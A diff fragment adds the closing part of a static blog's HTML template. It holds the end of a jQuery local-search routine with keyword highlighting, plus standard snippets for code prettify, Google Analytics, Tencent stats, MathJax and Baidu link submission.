+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
